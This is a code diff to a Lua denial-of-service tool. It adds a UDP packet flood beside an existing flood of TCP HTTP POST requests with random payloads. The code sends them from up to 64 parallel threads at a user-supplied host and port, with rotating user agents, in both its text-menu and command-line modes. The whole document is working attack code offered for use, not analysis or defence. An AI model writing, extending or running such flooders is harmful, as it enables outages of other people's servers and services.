@@ -22,6 +22,7 @@ m.useproxies = false -- skip proxies txt to lua convert if false
 m.uselanes = false -- multithread note: this clogs up thread so fast
 m.MAXTASK = 64 --attack in chunks fix thread clog up
 m.packetsize = 1024 --this is in byte
+m.udp = false
              
 return m
 ]] -- og from config.lua updatw
@@ -129,7 +130,9 @@ local function randchar(leng)
         res = res .. string.sub(charf, rand_index, rand_index)
     end
     return res
-end
+end --stackoverflow stuff
+
+-- proxies stuff
 
 local randproxy
 
@@ -141,8 +144,10 @@ if config.useproxies then
     end
 end
 
+-- unused
 
 -- ================================voids=================================
+
 --[[
     the tui functions start with t ex. tdos
     cli functions start with c ex. cdos
@@ -159,8 +164,8 @@ local function tdos()
             io.write("Port (note: http = 80, *https = 443) : ")
         elseif config.tdosportdefault == "http" then
             io.write("Port (note: *http = 80, https = 443) : ")
-        else
-            warn("invaild in tdosportdefault")
+        elseif tostring(config.tdosportdefault) == nil then
+            warn("invaild in tdosportdefault also input the port")
             exit()
         end
     local inputport = io.read()
@@ -179,7 +184,41 @@ local function tdos()
         while true do
             if config.useproxies then
                 print("proxies") --this will remain unfinish
-            else
+            elseif config.udp then
+                for i = 1, config.MAXTASK do --allocate
+                    activelanes[i] = lanes.gen("*", function()
+                                        local socket = require("socket")
+                                        local useragent = require("useragent")
+                                        math.randomseed()
+                                        for i = 1, 10 do
+                                            local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
+                                            local udp = assert(socket.udp())
+                                            udp:settimeout(0)
+                                            assert(udp:setsockname("*",0))
+                                            assert(udp:setpeername(tostring(inputhost), tonumber(inputport)))
+                                            assert(udp:send(tostring(randchar(config.packetsize))))
+                                            colord:curtosaveDEC()
+                                            tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. 
+                                                "Host: " .. string.format("%s:%d", tostring(inputhost), tonumber(inputport)) .. "\r\n" .. 
+                                                "User-Agent: " .. useragent.ua[math.random(#useragent.ua)] .. 
+                                                "\r\nConnection: close\r\n\r\n"
+                                            ) -- for some reason useragent change every 10 seconds and not every run
+                                            udp:close()
+                                            tcp:close()
+                                            colord:curtosaveDEC()
+                                            io.write(string.format(colord:eraseinline().."send to %s:%d times: %d",inputhost,inputport,count))
+                                        end
+                                    end)()
+                    count = count + 1
+                end
+                for i = 1, #activelanes do  --free
+                    local sellanes = activelanes[i]
+                    sellanes:cancel()
+                    sellanes:join()
+                    activelanes[i] = nil
+                end
+                collectgarbage("collect")
+            else --normal
                 for i = 1, config.MAXTASK do --allocate
                     activelanes[i] = lanes.gen("*", function()
                                         local socket = require("socket")
@@ -188,7 +227,11 @@ local function tdos()
                                         for i = 1, 10 do
                                             local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
                                             colord:curtosaveDEC()
-                                            tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. "Host: " .. string.format("%s:%d", tostring(inputhost), tonumber(inputport)) .. "\r\n" .. "User-Agent: " .. useragent.ua[math.random(1, #useragent.ua)] .. "\r\nConnection: close\r\n\r\n")
+                                            tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. 
+                                                "Host: " .. string.format("%s:%d", tostring(inputhost), tonumber(inputport)) .. "\r\n" .. 
+                                                "User-Agent: " .. useragent.ua[math.random(#useragent.ua)] .. 
+                                                "\r\nConnection: close\r\n\r\n"
+                                            ) -- for some reason useragent change every 10 seconds and not every run
                                             tcp:close()
                                             colord:curtosaveDEC()
                                             io.write(string.format(colord:eraseinline().."send to %s:%d times: %d",inputhost,inputport,count))
@@ -214,7 +257,11 @@ local function tdos()
                         local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
                         math.randomseed()
                         colord:curtosaveDEC()
-                        tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. "Host: " .. string.format("%s:%d", tostring(inputhost), tonumber(inputport)) .. "\r\n" .. "User-Agent: " .. useragent.ua[math.random(1, #useragent.ua)] .. "\r\nConnection: close\r\n\r\n")
+                        tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. 
+                            "Host: " .. string.format("%s:%d", tostring(inputhost), tonumber(inputport)) .. "\r\n" .. 
+                            "User-Agent: " .. useragent.ua[math.random(#useragent.ua)] .. 
+                            "\r\nConnection: close\r\n\r\n"
+                        ) -- inline is hard to read as hell shrink
                         tcp:close()
                         colord:curtosaveDEC()
                         io.write(string.format(colord:eraseinline().."send to %s:%d times: %d",inputhost,inputport,count))
@@ -227,7 +274,7 @@ end
 
 local function cdos()
     local ip = arg[2]
-    local port = arg[3]
+    local port = tonumber(arg[3])
     local count = 1
     if tostring(ip) == nil then
         warn("input the url pls")
@@ -238,15 +285,16 @@ local function cdos()
             port = 443 
         elseif config.tdosportdefault == "http" then
             port = 80
-        else
+        elseif tostring(config.tdosportdefault) == nil then
             warn("invaild in tdosportdefault also input the port")
+            exit()
         end
     end
     if config.uselanes then
         while true do
             if config.useproxies then
                 print("proxies") --this will remain unfinish
-            else
+            elseif config.udp then
                 for i = 1, config.MAXTASK do --allocate
                     activelanes[i] = lanes.gen("*", function()
                                         local socket = require("socket")
@@ -254,8 +302,18 @@ local function cdos()
                                         math.randomseed()
                                         for i = 1, 10 do
                                             local tcp = assert(socket.connect(tostring(ip), tonumber(port)))
+                                            local udp = assert(socket.udp())
+                                            udp:settimeout(0)
+                                            assert(udp:setsockname("*",0))
+                                            assert(udp:setpeername(tostring(ip), tonumber(port)))
+                                            assert(udp:send(tostring(randchar(config.packetsize))))
                                             colord:curtosaveDEC()
-                                            tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. "Host: " .. string.format("%s:%d", tostring(ip), tonumber(port)) .. "\r\n" .. "User-Agent: " .. useragent.ua[math.random(1, #useragent.ua)] .. "\r\nConnection: close\r\n\r\n")
+                                            tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. 
+                                                "Host: " .. string.format("%s:%d", tostring(ip), tonumber(port)) .. "\r\n" .. 
+                                                "User-Agent: " .. useragent.ua[math.random(#useragent.ua)] .. 
+                                                "\r\nConnection: close\r\n\r\n"
+                                            ) -- for some reason useragent change every 10 seconds and not every run
+                                            udp:close()
                                             tcp:close()
                                             colord:curtosaveDEC()
                                             io.write(string.format(colord:eraseinline().."send to %s:%d times: %d",ip,port,count))
@@ -270,6 +328,8 @@ local function cdos()
                     activelanes[i] = nil
                 end
                 collectgarbage("collect")
+            else
+                
             end
         end
         else
@@ -281,7 +341,11 @@ local function cdos()
                         local tcp = assert(socket.connect(tostring(ip), tonumber(port)))
                         math.randomseed()
                         colord:curtosaveDEC()
-                        tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. "Host: " .. string.format("%s:%d", tostring(ip), tonumber(port)) .. "\r\n" .. "User-Agent: " .. useragent.ua[math.random(1, #useragent.ua)] .. "\r\nConnection: close\r\n\r\n")
+                        tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. 
+                            "Host: " .. string.format("%s:%d", tostring(ip), tonumber(port)) .. "\r\n" .. 
+                            "User-Agent: " .. useragent.ua[math.random(#useragent.ua)] .. 
+                            "\r\nConnection: close\r\n\r\n"
+                        )
                         tcp:close()
                         colord:curtosaveDEC()
                         io.write(string.format(colord:eraseinline().."send to %s:%d times: %d",ip,port,count))
@@ -321,6 +385,16 @@ local function cddos() --lol
     prettytext:wait(1)
     exit()
 end
+
+local function tdirbust()
+    
+end
+
+local function cdirbust()
+    
+end
+
+-- i should combine
 
 -- =======================functions name for tui=========================
 
